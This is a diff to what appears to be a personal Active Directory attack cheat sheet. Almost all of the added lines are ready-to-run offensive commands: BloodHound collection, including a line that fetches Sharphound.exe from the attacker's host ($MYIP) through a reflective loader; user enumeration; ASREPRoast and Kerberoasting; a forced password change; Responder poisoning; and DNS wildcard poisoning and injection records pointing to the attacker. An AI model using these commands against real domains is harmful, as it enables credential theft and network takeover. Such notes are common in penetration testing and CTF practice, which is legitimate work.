@@ -2,8 +2,44 @@
 ## Guide
 https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 
-## Get a Ticket Granting Ticket
+## Clock Skew Sync
+sudo skewme $TARGET
+
+## Ticket Granting Ticket
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
+
+## Bloodhound Data
+bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
+\windows\tasks\Reflect.exe http://$MYIP/windows/Sharphound.exe -c all --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
+
+## List of Usernames and Computers
+impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
+impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
+cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
+cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
+
+## ASREPRoast
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames_$DC
+
+## Kerberoast: Users and Computers
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
+
+## Kerberoast: Targeted
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames_$DC
+
+## Password Change
+impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
+
+## DNS: Recon
+sudo responder -I tun0 -v
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
+
+## DNS: Wildcard Poisoning
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
+
+## DNS: Injection
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 
 ## Writable
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
